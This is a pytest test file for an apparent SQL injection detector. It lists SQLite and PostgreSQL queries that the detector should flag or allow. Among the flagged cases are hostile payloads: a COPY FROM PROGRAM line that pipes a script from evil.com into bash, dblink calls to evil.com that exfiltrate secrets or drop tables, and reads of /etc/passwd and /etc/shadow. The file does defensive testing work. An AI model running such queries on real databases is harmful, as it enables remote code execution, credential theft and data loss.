import pytest

from injectdb import validate_query


SQLITE_MALICIOUS = [
    "SELECT * FROM sqlite_master",
    "SELECT * FROM sqlite_schema",
    "SELECT * FROM sqlite_temp_master",
    "SELECT * FROM sqlite_temp_schema",
    "SELECT load_extension('/tmp/evil.so')",
    "SELECT writefile('/tmp/evil.txt', 'data')",
    "SELECT readfile('/etc/passwd')",
    "SELECT randomblob(1000000)",
    "SELECT sqlite_version()",
    "SELECT char(65, 66, 67)",
    "SELECT hex('evil')",
    "ATTACH DATABASE '/tmp/evil.db' AS evil",
    "DETACH evil",
    "PRAGMA table_info(users)",
    "PRAGMA database_list",
    "PRAGMA key = 'secret'",
    "CREATE TEMP TABLE evil AS SELECT * FROM users",
    "CREATE TEMPORARY VIEW evil AS SELECT * FROM users",
    "CREATE TEMPORARY TRIGGER evil AFTER INSERT ON users BEGIN SELECT 1; END",
    "CREATE VIRTUAL TABLE evil USING fts5(content)",
    "CREATE VIRTUAL TABLE evil USING rtree(id, x1, x2)",
    "SELECT sqlite_compileoption_get(0)",
    "SELECT sqlite_compileoption_used('THREADSAFE')",
    "SELECT glob('/tmp/*.db', name) FROM users",
    "SELECT zeroblob(1000000)",
    "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM r) SELECT * FROM r",
]

SQLITE_CLEAN = [
    "SELECT id, name FROM products WHERE id = 42",
    "SELECT COUNT(*) FROM orders WHERE status = 'shipped'",
    "SELECT email FROM users WHERE active = 1",
    "SELECT name FROM sqlite_sequence",
]


POSTGRES_MALICIOUS = [
    "SELECT * FROM pg_catalog.pg_tables",
    "SELECT * FROM pg_tables",
    "SELECT * FROM pg_class",
    "SELECT * FROM pg_namespace",
    "SELECT * FROM pg_attribute",
    "SELECT * FROM pg_proc",
    "SELECT * FROM pg_roles",
    "SELECT * FROM pg_settings",
    "SELECT * FROM pg_stat_activity",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT pg_read_binary_file('/etc/shadow')",
    "SELECT pg_ls_dir('/tmp')",
    "SELECT pg_stat_file('/etc/passwd')",
    "SELECT lo_import('/etc/passwd')",
    "SELECT lo_export(12345, '/tmp/out.txt')",
    "SELECT lo_get(12345)",
    "SELECT lo_unlink(12345)",
    "COPY users TO '/tmp/out.csv'",
    "COPY users FROM '/tmp/evil.csv'",
    "COPY users FROM PROGRAM 'curl http://evil.com/shell.sh | bash'",
    "SELECT dblink('host=evil.com dbname=postgres', 'SELECT * FROM secrets')",
    "SELECT dblink_exec('host=evil.com', 'DROP TABLE users')",
    "SELECT dblink_connect('host=evil.com dbname=postgres')",
    "SELECT $$evil$$",
    "SELECT $tag$evil$tag$",
    "DO $$ BEGIN RAISE NOTICE 'evil'; END $$",
    "DO 'BEGIN RAISE NOTICE ''evil''; END'",
    "CREATE EXTENSION dblink",
    "CREATE EXTENSION pg_stat_statements",
    "ALTER SYSTEM SET max_connections = 1",
    "ALTER SYSTEM SET log_directory = '/tmp'",
    "SELECT id::text FROM users",
    "SELECT id::integer FROM users",
    "SELECT data::bytea FROM users",
    "SELECT pg_sleep(5)",
    "SELECT pg_cancel_backend(1234)",
    "SELECT pg_terminate_backend(1234)",
    "SELECT pg_reload_conf()",
    "SELECT version()",
    "SELECT current_database()",
    "SELECT current_schema()",
    "SELECT inet_server_addr()",
    "SELECT inet_server_port()",
    "SELECT pg_postmaster_start_time()",
    "SELECT generate_series(1, 1000000)",
    "SELECT format('%s', user_input) FROM users",
    "DELETE FROM users WHERE id = 1 RETURNING *",
    "INSERT INTO users (name) VALUES ('evil') RETURNING id, password",
    "UPDATE users SET name = 'evil' RETURNING *",
    "SET ROLE admin",
    "SET SESSION AUTHORIZATION postgres",
]
POSTGRES_CLEAN = [
    "SELECT id, name FROM users WHERE id = 1",
    "SELECT COUNT(*) FROM orders WHERE status = 'shipped'",
    "SELECT email FROM users WHERE active = true",
    "SELECT id, amount FROM invoices WHERE total > 100.00",
    "SELECT * FROM products ORDER BY created_at DESC LIMIT 10",
]


@pytest.mark.parametrize("query", SQLITE_MALICIOUS)
def test_sqlite_detects_injection(query):
    assert validate_query(query) is True, f"Should have flagged: {query}"


@pytest.mark.parametrize("query", SQLITE_CLEAN)
def test_sqlite_allows_clean_input(query):
    assert validate_query(query) is False, f"Should not have flagged: {query}"


@pytest.mark.parametrize("query", POSTGRES_MALICIOUS)
def test_postgres_detects_injection(query):
    assert validate_query(query) is True, f"Should have flagged: {query}"


@pytest.mark.parametrize("query", POSTGRES_CLEAN)
def test_postgres_allows_clean_input(query):
    assert validate_query(query) is False, f"Should not have flagged: {query}"
